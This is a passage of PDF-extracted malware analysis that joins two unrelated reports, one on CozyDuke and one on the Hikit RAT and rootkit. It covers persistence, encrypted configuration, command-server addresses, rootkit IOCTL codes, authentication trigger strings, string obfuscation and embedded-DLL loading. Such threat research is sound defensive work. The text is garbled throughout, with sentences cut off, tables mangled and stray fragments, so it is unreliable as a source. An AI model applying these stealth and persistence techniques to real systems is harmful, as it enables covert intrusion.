specified in the droppers configuration file.Finally, the 
dropper will use the copy of rundll32.exe to load and 
execute the CozyDuke main component.Encrypted 

configuration 

file

CozyDuke 
components

COZYDUKE  Malware analysis4

COZYDUKE MAIN COMPONENT

Overview
The main component of CozyDuke is a DLL file 
responsible for orchestrating all of CozyDuke’s activity on 
a victim machine.The main component is executed by 
the CozyDuke dropper using a copy of rundll32.exe.The 
entrypoint function varies, but is always specified in the 
dropper configuration.The most important functionalities offered by the main 
component are establishment of persistence, gathering 
of basic system information, communication with the C&C 
server and the execution of additional tasks, modules or 
executables as commanded by the C&C server.Persistence

CozyDuke may use multiple techniques for establishing 
persistence; the following is one technique used.CozyDuke may also register itself as a Windows service 
or scheduled task.Additionally, CozyDuke may 
utilize a technique known as COM-object hijacking 
[1] to establish persistence.To achieve this, CozyDuke 
will “hijack” the registry entries for the COM object 
“SharedTaskScheduler”.CozyDuke will modify the 
registry entries in such a way that any loading of the 
SharedTaskScheduler COM object will first load a special 
CozyDuke module that will ensure CozyDuke stays active 
on the victim host.Configuration data

The configuration data for CozyDuke is stored as a 
separate RC4-encrypted file that is written to disk by the 
CozyDuke dropper during initial infection.The name of 
the encrypted configuration file on disk has been racss.dat in all of the observed cases.The decrypted file is 
formatted as XML with the UTF-16LE character encoding.com

/app/index.php

www.cifss.org

pvt.relance.fr

200.119.128.45

202.206.232.20

/product_thumb/index.php

/catalogue/json/index.php

 /mobile.php

/rss.php

www.getiton.hants.org.uk

/themes/front/img/ajax.php

www.seccionpolitica.In CozyDuke samples 
from July of 2014, the RC4 key has been embedded in the 
encrypted configuration file.In this case, the encrypted 
configuration file will begin with a 4-byte value specifying 
the length of the included RC4 key.This will be followed 
by the actual key.Finally, the rest of the file will be the 
actual configuration data.Command and control communication

CozyDuke’s main method of communicating with its 
command and control server is using either HTTP or 
HTTPS.The method of communication, as well as the 
address to connect to, are specified in CozyDuke’s 
configuration data.In the cases we have observed, the 
configuration data for any single CozyDuke instance has 
included the details of either one or two C&C servers.Listed above are details of known CozyDuke C&C servers.We believe all of the ones listed are compromised servers.In addition to its main communication method, 
CozyDuke also features the ability to use Twitter as a 
backup C&C channel.In cases where CozyDuke utilizes 
this functionality, the twitter account to be used will be 
specified in CozyDuke’s configuration data.We have only 
observed two samples where a backup Twitter account 
was actually specified in the configuration data.These 
accounts were @US2515 and @monkey_drive.Tasks

CozyDuke’s primary purpose is the execution of tasks.These tasks usually involve the execution of modules or 
executables providing additional functionality.The main 
difference between the two is that modules are DLL files 
loaded in memory by the CozyDuke main component, 
whereas executables are PE executable files that 
CozyDuke will write to disk and execute.For the purpose of managing tasks, the main component 
of CozyDuke implements 6 commands that the C&C 
server can specify.These commands are briefly described 
in Table 2 (overleaf).COZYDUKE TASKS

Based on samples obtained from our own collections 
and generously shared to us by a trusted source, we 
have been able to identify some of the tasks executed 
recently by CozyDuke.These tasks can be divided into 
two categories.The first consists of CozyDuke modules 
which are DLL files loaded in memory by the main 
component of CozyDuke for the purposes of extending 
CozyDuke’s functionality.The second category consists 
of PE executable files that CozyDuke will write to disk 
and execute on the infected host.These executables are 
usually droppers similar to those used to infect a host 
with CozyDuke.In this case, however, instead of dropping 
CozyDuke, the executables may drop other executables, 
scripts or DLLs.Once executed by CozyDuke, these 
executables function independently of CozyDuke’s main 
component.In many cases, 
the scripts utilized Microsoft OneDrive accounts for data 
transfer.COZYDUKE EVOLUTION
The earliest CozyDuke sample we have observed so far 
was compiled on the 29th of December, 2011.The sample 
in question was not an actual CozyDuke main component, 
but a CozyDuke module.The earliest main component 
we observed was compiled on the 29th of February, 2012.The main component in question stores its strings and 
configuration in an unencrypted form.Additionally, the 
configuration is stored embedded in the binary, not as 
a separate XML file in the manner of newer CozyDuke 
versions.Even this oldest main component does however 
use XML for other purposes via the open-source Pugi-XML 
library.The next CozyDuke main component we observed 
was compiled on the 30th of November, 2012.By then, 
the authors had switched to encrypting the strings 
and the configuration.However, the configuration 
was still stored embedded in the binary.Design-wise, 
this sample is a bit of an outlier.Instead of being a DLL 
file, the main component is actually an EXE that, in 
addition to the configuration, embeds multiple DLLs that 
provide additional functionality to the main component.Apart from the different design, functionally the main 
component is very similar to other CozyDuke main 
components.It is possible the authors of CozyDuke were 
trying out a new design, but eventually decided to go 
back to the original.The next CozyDuke main component we observed, 
compiled on the 2nd of July, 2014, is again a DLL file.We have yet to 
observe samples from 2013, but we believe CozyDuke to 
have been under active development as well during that 
year.Between 2012 and 2014, the authors of CozyDuke 
appear to have performed significant refactoring of 
the CozyDuke codebase, even though functionally the 
differences are smaller.Examples of this refactoring 
include for instance the switch from using the Pugi-XML 
library to using Microsoft’s MSXML 3.0 for XML-related 
functionality.The latest CozyDuke main component we observed 
was compiled on the 26th of February, 2015.The core 
functionality of the latest sample is very similar to the 
previous sample from July of 2014, but the authors 
of CozyDuke have implemented a lot of additional 
functionality, as the increase in size from 279KB to 820KB 
would also suggest.                                                                                                            	
  
	
  

Hikit Analysis
Basic Description
Hikit consists of at least two generations of malware that provides basic RAT functionality.The first
generation of Hikit (referred to as “Gen 1”) operates as a server and requires an externally exposed
network interface in order for an attacker to access the victim machine.The second generation of Hikit
(referred to as “Gen 2”) uses the more traditional client model and beacons out to an attacker’s C2
server.While the communication models shifted dramatically between Gen 1 and Gen 2, both
generations of Hikit retain the same basic RAT function consisting of remote command shell, file
management, network proxy and port forwarding.Both Gen 1 and Gen 2 sub-families of Hikit consist of a main DLL (referred to as “the DLL”) that
contains the RAT functionality; a kernel driver (referred to as “the Driver”) with Gen 2 also employs an
additional component: a loader executable.The driver component of Gen 1 and Gen 2 are drastically
different in their operation and intent.For the Gen 1 sub-family of Hikit, the driver acts as a NDIS
(network) driver that is responsible for interfacing the DLL to the network while preventing a direct
WinSock interface from occurring.The Gen 1 Driver listens to network traffic arriving at the local
network interface and waits for a specific trigger string.The trigger string varies by Driver and DLL
sample.The Gen 2 Driver is a simpler system driver that acts as a rootkit to hide processes, registry
keys and network connections associated with Gen 2 activity on the victim’s system.Gen 2 uses a standard client-server malware model meaning that the malware no longer requires a
direct Internet-facing network card, no longer uses a network driver for networking, and provides the
ability to network multiple Gen 2 samples behind a firewall with greater ease (from the attacker’s
perspective).The Gen 2 sub-family, however, no longer employs network stealth provided by the Gen 1
network driver which exposes the C2 server addresses to analysts.Each of the Hikit generations contains multiple sub-generations as the author(s) of Hikit have evolved
their code over time.There is a noticeable steep improvement over the code base of Gen 1 Hikit family
during its 2011 development period.The Gen 2 sub-generations share a similar improvement scale
between late 2011 and late 2013.Evolution
The earliest known Hikit sample dates back to 31 March 2011.Known as the Gen 1.0 sub-generation of
Hikit Gen 1, the first known sample of Hikit deviated from the later traditional Gen 1 model.The Gen 1.0
sample was a standalone executable whereas subsequent Gen 1 sub-generations use a DLL running
as a service.The Gen 1.0 sample is clearly a work-in-progress.The Gen 1.0 sample, while different
than subsequent sub-generations, does still rely on the Driver component and for the most part the
structure of the code does not differ much going forward into the Gen 1 evolution.Less than three weeks after Gen 1.0, the author(s) of Hikit move into Gen 1.1.The notable change is
that the Hikit model of using a DLL and driver, which has remained until present day, comes into being.The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change.Both
Gen 1.0 and Gen 1.1 use plaintext data transmissions.Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011
based on a lack of available samples found.During this time the development of Hikit appears to
change locations.Gen 1 samples have Program Database (PDB) file strings that identify the file path of
the Hikit source code.For Gen 1.0 and Gen 1.1 samples, the file path of the Hikit source code is
consistently h:\JmVodServer\hikit.Starting with Gen 1.2, the file path switches to
e:\SourceCode\hikit_new.It is at this time that the functionality of Hikit Gen 1 begins to mature.In Gen 1.2, the communication between the infected machine and the attacker is encrypted using an
XOR mask.A more subtle change is the renaming of the “socks5” command to simply “proxy” within
the code.The code within Hikit begins to mature but the overall functionality does not expand beyond
the original set of commands found in Gen 1.0.The other remarkable change within the Gen 1.1 to Gen
1.2 development is the way in which the session handshake trigger operates.In Gen 1.0 and Gen 1.1,
the DLL instructs the Driver to listen for a specific string (typically a HTTP request string) and responds
with another string.In Gen 1.2, the Driver has a hardcoded trigger string (a specific HTTP request
string) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific
hexadecimal value.This moves Gen 1.2 into more of a username/password authentication scheme
whereas previous sub-generations could potentially be accessed by accidental HTTP requests.At the
same time, the Driver responds with a specific value with in the Etag HTTP header field.This places
Gen 1.2 into a more stealth position as a random, non-HTTP compliant response from Gen 1.0 and
Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag
header.Gen 1.2’s development cycle appears to exist between 23 October 2011 and 2 November 2011 with
several new samples being found on the Internet having legitimate compile times during this time
window.There is, however, evidence that the development of Hikit Gen 1 and Gen 2 overlap by several
months.The earliest Gen 2 sample known to exist dates to 28 August 2011, two months before the first
known Gen 1.2 sample.The last known Gen 1.2 sample, and by extension, the last known Gen 1
sample, dates to 9 April 2012.The first known Gen 2 sub-generation, Gen 2.0 Alpha, much like Gen 1.0, represents an early
development version of the Gen 2 Hikit sub-family.Gen 2.0 Alpha is a stand-alone Windows console
executable that can run as a service executable.Gen 2.0 Alpha supports the same commands as Gen
1.2 with an additional command that returns the infection’s configuration information.On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer(s) of Hikit.Also a stand-alone console executable like Gen 2.0 Alpha, the Gen 2.0 Beta code changes internally
without providing significant functionality improvements with the exception of now the executable uses
a device driver to hide network, file, and registry artifacts related to its operation.Both Gen 2.0 Alpha
and Gen 2.0 Beta still retain PDB file path information within their binaries.During the development
phase of Gen 2.0 Alpha, development of the Gen 2.0 Alpha variants changes locations.First version of
the Gen 2.0 Alpha malware, from 28 August 2011, has the PDB path located in
H:\JmVodServer\Matrix_new2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta
binaries has the PDB path in E:\SourceCode\Matrix_new which suggests that the source code for
both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time.This may
indicate either a single developer or a team (or set of teams) with shared resources.The first known Gen 2.1 binary has a compile date of 17 April 2012.Gen 2.1 represents the first Gen 2
sub-generation to use an executable-based loader, DLL and driver model, a model that all subsequent
Gen 2 sub-generations employ.The functionality of the Gen 2.1 sub-generation is the same as the


	
  
	
  


previous generations with no new commands being introduced.Gen 2.1 is the first sub-generation in
the Gen 2 sub-family to introduce 64-bit binaries.The Gen 2.2 sub-generation appears to have begun on 20 July 2012.Gen 2.2 is notable for altering
where the configuration information of the RAT is stored and using both DLL-based and executable-
based loaders.Also notable is the fact that the sub-generation spans a significant amount of time with
intermittent periods of development.The bulk of the Gen 2.2 samples that have the tell-tale marks of
being the product of a builder have a compile date of 26 July 2013, a full year after the first known Gen
2.2 sample.Between 21 July 2012 and 20 February 2013, there are no known Gen 2.2 binaries.The
two 20 July 2012 samples have different compile times indicating they were not the product of a builder
but rather unique compilations.Between 21 February 2013 and 27 February 2013, there are 4 unique
compilation dates for the DLL component with 7 unique, known Gen 2.2 DLLs.The bulk of Gen 2.2
samples have a compile date of 26 July 2013.There are approximately 25 known Gen 2.2 DLLs with
the 26 July 2013 compile date.The Gen 2.2 sub-generation appears to exist through at least 19
September 2013.The last known Gen 2 sub-generation, Gen 2.3, began on 12 December 2013.Gen 2.3 is notable for its
use of a legitimate SSL certificate as part of the handshake between the infected machine and the
attacker’s C2.The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS
sensors that look for encrypted traffic.Another interesting aspect of the Gen 2.3 sub-generation is that
there is no longer a marker to designate the beginning of the embedded configuration.Gen 2.1 and
Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in
order to allow the builder to locate the configuration space when constructing a new configuration for
the binaries.Gen 2.3, however, uses a specific location instead, requiring the builder to calculate the
specific location using the PE/COFF header of the binary.Also, while Gen 2.1 and Gen 2.2 retain the
configuration within the DLL component, Gen 2.3 stores the configuration within the loader component.This allows the attackers to configure the loader without having to update the DLL.The evolution of Hikit is a long and drawn out series of small, incremental development changes.The
important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed
in late 2011 and development of Gen 2 has a several month overlap with the development and usage
of Gen 1.The following table provides a quick reference to the generational (and sub-generational)
designations of Hikit.August
                                        28, 2011


                                 Timeline Outlined in Appendix A: HiKit Versions


The Driver
The Driver component for Hikit varies based on the specific Hikit sub-family (Gen 1 or Gen 2).As such
it is necessary to describe each in the context of its specific sub-family.Gen 1 Driver
The Driver component of Gen 1 Hikit variants provides the interface between the victim’s network
interface card (NIC) and the DLL.The Driver is a NDIS (network) driver that integrates into the victim’s
network stack.The Driver intercepts any and all network communication that traverses the Windows
network stack and potentially removes the data from the network stack under very specific conditions.When the Driver removes data from the network stack, the Driver stores the removed data in local
buffers for the Gen 1 DLL to query against.The purpose of this behavior is to allow the DLL to interact
with the network without utilizes the WinSock API which could potentially reveal the presence of Hikit.In order to interact with the Driver, the DLL uses the function	
  IoDeviceControl	
  to send commands to
the Driver.The Driver registers itself at both	
  \Device\w7fw	
  and	
  \DosDevices\w7fw	
  thereby
allowing the DLL to access the Driver by performing a	
  CreateFile	
  request to	
  \\.\w7fw	
  or	
  
\\.\Globals\w7fw in order to obtain a handle to the Driver.The Driver’s interface supports the
following OIDs:




	
  
	
  


       OID             Function
       0x12C828        No-op
       0x12C82C        Retrieves bytes from the recv queue.0x12C830        Add bytes to the xmit queue.A new
channel occurs when the Driver detects a trigger string.The trigger string is typically a short form HTTP
request with the following trigger strings found in the wild:

       Generation(s)    Trigger String                   Authentication Response Value
                                                         Value
       Gen 1.0, 1.1     GET /password                                   .welcome.In Gen 1.2, whenever the Driver detects a trigger string, the Driver inspects the rest of the data
received for the authentication value.If the token follows the trigger string (there is no specific limitation
on how far from the trigger string the password token must be), then the Driver generates a new
channel that the DLL will use as the conduit between the DLL and the client.The Driver appears to be based off the NDIS example source code PassThru.More specifically, the
author(s) of the Driver appear to have used the modified version of the PassThru example,
PassThruEx, by James Antognini and Thomas Devine from a 2003 blog post1.Gen 2 Driver
The Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (“the Driver”) to
hide aspects of the DLL’s functionality from normal system processes.The Driver is a relatively
straightforward piece of software.It does not attempt to obfuscate its functionality from static analysis
and it hooks a minimum number of kernel API functions in order to hide different pieces of information.The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of
the code coming directly from a Chinese blog3.The Driver expose an IOCTL interface that supports the following OIDs:

        OID                                                                                                                  Function
        0x22C000                                                                                                             Add driver (system module) to hide.0x22C004                                                                                                             Reveal all hidden items.0x22C008                                                                                                             Add IP:Port endpoint to hide.0x22E000                                                                                                             No-Op
        0x22FFD0                                                                                                             Remove PID from hidden list.0x22FFD4                                                                                                             Add PID to list of PIDs to hide.0x22FFD8                                                                                                             Add service to list of services to hide.0x22FFE0                                                                                                             Add local port to list of ports to hide.0x22FFE4                                                                                                             Currently unused.Evidence suggest this was previously a port hiding function, but it
                                                                                                                             is no longer functional.0x22FFE8                                                                                                             Currently unused.It is unclear the purpose of this function.It takes a string as its
                                                                                                                             argument.0x22FFEC                                                                                                             Add directory to list of directories to hide.0x22FFF0                                                                                                             Add registry key to list of registry keys to hide.0x22FFF4                                                                                                             Add registry key value to list of registry values to hide.0x22FFFC                                                                                                             Purge all hooks and hidden items ("unhook")

The Driver is capable of hiding processes (by PID, not name), system modules, services, network
connections, listening ports, directories (and by extension, files), as well as registry keys and values.In
order to hide these items, the Driver hooks various Windows Kernel API calls.“Extending	
  the	
  Microsoft	
  PassThru	
  NDIS	
  Intermediate	
  Driver—Parts:	
  Two	
  IP	
  
Address	
  Blocking	
  NDIS	
  IM	
  Drivers”.December	
  15,	
  2003	
  
2
  	
  pudn.“Agony	
  Rootkit	
  code,	
  the	
  stability	
  and	
  can	
  be	
  useful	
  Driver	
  Develop”.http://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.8	
  April	
  2007.3
  	
  CardMagic.“[Reserved]	
  NSI	
  Module	
  Hook:	
  Hiding	
  Port	
  Under	
  Windows	
  Vista”.http://forum.eviloctal.com/archiver/tid-­‐
29604.html.8	
  July	
  2007.Item              API Function Hooked
       Local Listening   ZwDeviceIoControlFile
       Port
       Remote            ZwDeviceIoControlFile
       Endpoint
       Loaded Drivers    ZwQuerySystemInformation
	
  

In order to hide services, the Driver will access the memory of the services.exe process, locate the
linked list of services and remove the service entry that the Driver wishes to hide.This is a surprisingly
invasive method to obfuscate a process.Upon activation, the Driver will expose its interface by calling	
  IoCreateDevice	
  with the name
\Device\agony	
  (for Gen 2.0 Beta samples), \Device\HTTPS	
  (for Gen 2.1 samples),	
  
\Device\advcachemgr	
  (for Gen 2.2 samples) or \Device\diskdump	
  (for Gen 2.3 samples).The
Driver also creates a symbolic link to the device using the same name but under the	
  \DosDevices\	
  
tree.For reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide
network connections on Windows Vista and later decided to keep the example IP address within the
code.Functionality and Commands
The Hikit family has supported roughly the same set of commands since the first known samples of
Gen 1.0.Gen 2.0 introduced a single command to provide insight into an infected machine’s Hikit
configuration (something that is not necessary for Gen 1 variants since they are server-based).The
RAT supports the following commands:

       Command       Introduced   Description
       shell         Gen 1.0      Establishes a remote command shell on the victim machine
       file          Gen 1.0      File managerment
       connect       Gen 1.0      Establishes a tunnel connection (e.g.port forwarding) through
                                  another Hikit sample
       socks5        Gen 1.0      Establishes a forwarding proxy (retired in Gen 1.2)
       proxy         Gen 1.2      Establishes a forwarding proxy
       information   Gen 2.0      Returns the configuration for the Hikit infection
                     Alpha
       exit          Gen 1.0      Terminates a channel


Command:  shell  
The	
  shell	
  command activates a remote shell on the victim’s computer.The remote shell function uses
the standard pipe redirection method for interfacing a network application (in this case, the DLL) to a
hidden command shell.Command:  file  
The	
  file	
  command provides an attacker with a variety of disk access options such as listing
directories, changing the current directory, and uploading and downloading files.Command:  connect  
The	
  connect	
  function provides the functionality to allow one Hikit DLL to interface with another DLL of
a similar version.The use of this functionality can best be illustrated by considering the fact that the
Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen
1’s RAT function.This would prohibit lateral movement within a victim’s network as the bulk of any
organization’s network infrastructure is not directly exposed to the Internet.By using the connect
command, an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL
that is behind the firewall, effectively making the externally exposed Gen 1 DLL a local router for Hikit
traffic.Command:  proxy (Gen 1.2 and later), socks5  (Gen 1.0 and 1.1)  
The	
  proxy	
  (or	
  socks5) command allows an attacker to utilize a Hikit-infected machine as a proxy.Command:  information  
Gen 2 samples rely on a configuration in order to know where the C2 server exists along with other
operational aspects such as the name of its service and operational times.This information is important
for the attacker to have access to in order to determine if any aspect of the configuration is out of date
(thus requiring a new variant of the Gen 2 binary to be configured and deployed).The	
  information	
  
command returns to the attacker the complete configuration and current state of the Gen 2 malware.Command:  exit  
As the name implies, the	
  exit	
  command causes the DLL to discontinue the current connection.Hikit Core Analysis
With the Gen 1 sub-family using a server model and the Gen 2 sub-family using the client model,
understanding how each of the DLL components of the sub-families works is best done, as with the
Driver above, in the context of the specific sub-family.Gen 1 Analysis
As noted previously in this report, the Gen 1 sub-family has several sub-generations but overall the
functionality of the Gen 1 sub-family has remained constant.With the exception of Gen 1.0, the
functionality of Gen 1 comes from the DLL component (Gen 1.0 uses a stand-alone executable to
achieve the same results).The DLL operates as a service, requiring an attacker is install the DLL as a
service at some point prior to activation.The DLL contains only two exports: DllEntryPoint	
  and	
  
DllRegisterServer.Ultimately, both exports generate a new thread of the same function
(“mainThread”).The difference between the two exports is that DllRegisterServer	
  can take an
optional command line argument of the letter “u” which will instruct the main thread to uninstall the Gen
1 system from a victim’s computer.If the uninstall argument exists,	
  mainThread	
  will simply remove the
Driver from the victim’s machine and terminate.The authors of Gen 1 used freely available source code
found online for their removal function.4


	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
   	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  	
  
4
 	
  PCAUSA.“Programmatically	
  Installing	
  NDIS	
  Protocol	
  Drivers”	
  http://www.ndis.com/ndis-­‐
general/ndisinstall/programinstall.htm.2	
  December	
  2013.When the DLL activates, either by a call to	
  DllEntryPoint	
  or by calling	
  DllRegisterServer	
  
without the u parameter,	
  mainThread	
  begins by verifying the version of the Driver installed on the
victim’s machine.This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit
value with the required driver version.If the version is incorrect (i.e.it doesn’t match the specified
version), the DLL installs the version of the Driver found within the DLL’s resource section (under the	
  
BIN	
  resource tree).With the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will
instruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen
1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate
URL.The DLL again checks the version of the Driver and, in some versions of the DLL, will print a
message indicating the version of the Driver installed and report the “Transate version” (the word
translate is misspelled within the binary).It appears that the Driver and the communication protocol
version do not necessarily have to match exactly, allowing the possibility that the Driver and the DLL
could be compiled at separate times.If the Driver version is less than the “Transate” version (indicating
that the Driver is a version too old to support the necessary communication protocols), the DLL will, in
some version of the DLL, print out a line to the screen indicating the DRIVER_MIN_VERSION	
  required
along with the current Driver version.Following this, the DLL will then attempt to install the correct
version of the Driver prior to terminating.It is unclear why this code exists given that the DLL will check
the Driver version and correct the Driver if necessary prior to reaching the portion of the code that
reports the	
  DRIVER_MIN_VERSION.It is possible that the second Driver version check is a last ditch
effort to ensure the correct Driver is installed.The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists.A
channel represents an established connection between the Driver and an external party that has
provided the proper initial request and, for Gen 1.2 variants, provided the proper authentication value.When the Driver establishes a new channel, the DLL generates a runtime data structure before
generating a new thread (“HikitThreadFunc”) which will service any request coming from the new
channel.This allows the DLL to service multiple channels at one time.The HikitThreadFunc	
  function is, at its core, a simple wait and respond loop.The function begins by
transmitting a Hikit command prompt to the client (Hikit>) before settling into an infinite loop of	
  

       •   Read data from channel (wait until data is available)
       •   [For Gen 1.2] Decrypt the packet header
       •   Verify the packet header to ensure the communication version is correct and the payload data
           size is non-zero
       •   Read the remainder of the packet (e.g.the payload portion)
       •   If the packet type field (dwPacketType) is zero, send the payload section to the command
           processor.•   Send the Hikit prompt
The communication scheme between the DLL and the client consists of a 20 to 24 byte header (for Gen
1.0 and Gen 1.1) or a 28 byte header (for Gen 1.2) followed by an optional payload.Whereas the key field in Gen 1.2 samples contains a 32-bit value that
represents the XOR key for the remainder of the PacketHeader and any additional payload data.The
XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR’d against the key
value.Version checking is important in all Gen 1 variants.The dwHikitVersion	
  field allows the client and
the DLL to ensure that they have a compatible communication scheme in place prior to executing
commands.Gen 1 samples have a particular interest in the victim’s locale language preferences.While it is typical
for most RATs that provide remote shells to simply pass data unfiltered from client to server and server
to client without regard to code pages, Gen 1 samples take special care to record the code page and
locale information in each and every packet header that traverses the divide between client and server
and server and client.This could indicate that the authors of Gen 1 understood from an early stage in
the development of Gen 1 that they would be attacking computer systems with different locales and
code pages.Gen 2 Analysis
The Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality.In order for the
DLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as “the
Loader”).The Loader comes in the form of a standard executable image or a DLL image.Despite the
different models, both variants of the Loader load the embedded DLL in the exact same way.The only
difference between the executable and DLL versions of the Loader comes in how they handle the
initialization of the embedded DLL.Figure 1: DLL (left) and executable (right) Loader startup routines

Figure 1 provides a side by side comparison of the startup routines for the executable and DLL
Loaders.Both versions of the Loader begin by loading the embedded DLL from the Loader’s resources
(item 102 under the Group Icons resource tree), decrypting and decompressing the image into memory,
then manually loading the DLL into memory using a custom loading routine.The function	
  
LoadEmbeddedImage, as seen in part in Figure 2, is responsible for this operation.Figure 2: LoadEmbeddedImage function snippet

The Loader obfuscates many strings by using a simple XOR encoding scheme.Decryption of encoded
strings consists of taking the first value of the string as the XOR key, XOR’ing all subsequent bytes until
the result of the XOR returns 0.The decoding of the encoded strings is handled by the DecodeString
function.The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image.In
order to locate the embedded DLL,	
  LoadEmbeddedImage	
  will use the	
  DecodeString	
  function to
decrypt the delimiter string (which is typically	
  zzzzzzzzzz	
  or	
  yyyyyyyyyy) and then search the icon’s
resource memory for the delimiter string.Once located,	
  LoadEmbeddedImage	
  will use the first 12
bytes immediately after the string as the information structure about the embedded DLL.The structure
(seen below) defines the size of the embedded DLL within the icon’s resource memory, the size of the


	
  
	
  


DLL after it is decompressed and a 4-byte XOR key that	
  LoadEmbeddedImage	
  must use to decode
the embedded DLL prior to decompression.struct ImageHeader
        {
           DWORD dwImageEncodedSize;
           DWORD dwImageSizeDecompressed;
           DWORD EncodingKey;
        };


LoadEmbeddedImage	
  copies the compressed embedded DLL into a newly allocated heap buffer and
then calls the function	
  decodeBuffer	
  (using the	
  EncodingKey	
  value) to decrypt the embedded DLL.Another heap buffer is allocated with a size equal to the value of	
  dwImageSizeDecompressed.The
decompression buffer along with the now decoded compressed buffer are given to lzo_decompress	
  
which decompresses the compressed image using the LZO1X algorithm5.With the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage	
  calls	
  
ImageLoaderData::LoadDll	
  to manually load the DLL into memory.ImageLoaderData::LoadDll	
  interprets the PE/COFF header of the DLL image, loads the image
into the appropriate memory configuration, performs the necessary relocation operations, and calls the	
  
DllMain	
  (DLL’s entry point) function.After loading the embedded DLL image into memory, the Loader will either call the DLL’s	
  
StartServer	
  or	
  MatrixMain	
  function depending on the type of Loader.The standalone Loaders use
the	
  MatrixMain	
  function while the DLL Loaders will call the	
  StartServer	
  function.The Loaders,
upon unloading, will call the StopServer function in order to shut down the embedded DLL.The Gen 2 DLL exposes five exported functions (besides the	
  DllEntryPoint/DllMain).Export Name                                                                                                                                                               Description
        DllRegisterServer                                                                                                                                                         If the Gen 2 RAT is running, waits for the RAT to shut down before returning.MatrixMain                                                                                                                                                                Activates the Gen 2 RAT (called from a stand-alone Loader)
        SetModuleHandle                                                                                                                                                           The given parameter becomes the new module handle for the RAT.MatrixMain, however, has added functionality.Oberhumer,	
  “LZO	
  real-­‐time	
  data	
  compression	
  library”	
  http://www.oberhumer.com/opensource/lzo/.29	
  
June	
  2014.	
  


	
  
	
  


where Arguments parameter can be:

       Arguments string                                 Purpose
       test {DWORD identifier (IP?)}Overrides the current configuration with the given
       {listening Port} [C2 address] [C2 port]          settings.The C2 arguments are optional.i                                                Installs trojan service
       u                                                Uninstalls the trojan service
       s                                                Sets the SHOW flag for the service to instruct the
                                                        Driver to reveal the service.h                                                Sets the HIDE flag for the service to instruct the
                                                        Driver to hide the service.q                                                Sets the STOP flag for the RAT.If the i	
  parameter is given, the DLL will install itself as a service on the victim’s machine.The DLL will
create a new service (e.g.“Network DDE Service”) and assign itself as the executable for the service.The DLL’s RAT functionality provides basic features such as network port forwarding (proxying), file
transfer, and remote command shell.The RAT functionality provides an attacker with the ability to
establish a phantom network within a victim’s infrastructure by having individual instances of Gen 2 DLL
listen for incoming connections on local ports (presumably, NAT’d ports) and accept commands from
the inbound connection.This allows an attacker to establish several Gen2 infections within a victim’s
infrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker
can route commands to the pseudo-isolated infections through accessible infected machines providing
a high level of persistence to the malware.Each Gen 2 infection can support up to 10 listening ports.The communication between the Gen 2 malware and the C2 (or other Gen 2 malware, in the case of
the internal routing functionality) is encrypted using a simple DWORD XOR scheme.Each
communication burst (either between the malware and the C2 or the malware and neighboring
malware) begins with a 24-byte header identical to the header found in Gen 1.2.Immediately following
the header is the type-specific (as indicated by the	
  dwPayloadType field) payload data.Note that the	
  
dwXORKey	
  value is NOT encoded with the XOR value, but rather is the value that is used for encoding
the header and payload.Each DLL includes a hardcoded, default configuration.At the time that the RAT functionality activates,
the DLL will drop the current configuration to disk.If the configuration file already exists, then the RAT
will use the file version of the configuration over the default configuration.The configuration data
structure (seen below) doubles as a current state record for some aspects of the communication
subsystem of the DLL.When stored on disk, the configuration is preceded by a GUID value (16 bytes)
that represents the unique identifier for the specific infection.The configuration is XOR encoded using
the first 4 bytes (as a DWORD) of the GUID.The DLL contains a device driver image embedded within an encoded buffer which the RAT
functionality code will extract to the %TEMP%	
  directory (after XOR’ing the buffer with 0x76).To activate
the rootkit, the RAT functionality code creates a service with the driver in the %TEMP%	
  directory as the
executable for the service.The RAT functionality code then activates the service and opens a handle to
device driver’s interface (e.g.\Globals\HTTPS).With the handle open to the rootkit driver, the RAT
functionality code deletes the service in order to reduce the visible footprint of the new driver.To further
reduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the
rootkit to hide the DLL’s PID, any references to the GUID {4AE26357-79A3-466D-A6D9-
FC38BFB67DEA}, the DLL’s service names (e.g.“NetDDESrv” and "Network DDE Service") and the
service entry as well.Additionally, the code also attempts to hide a service named “Hitx”.Support Software
In addition to the main Hikit malware, there are at least two examples of support programs that belong
to the Hikit family.Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b and
7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 are examples of Gen 1.0 and Gen 1.2 operator
consoles.The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection’s IP address
and proceeds to connect and authenticate with the infected server.Once connected, the operator has
the basic Hikit functionalities available to them via commands such as file and shell.The encrypted nature of the nominal Gen 1.2 and later network traffic makes
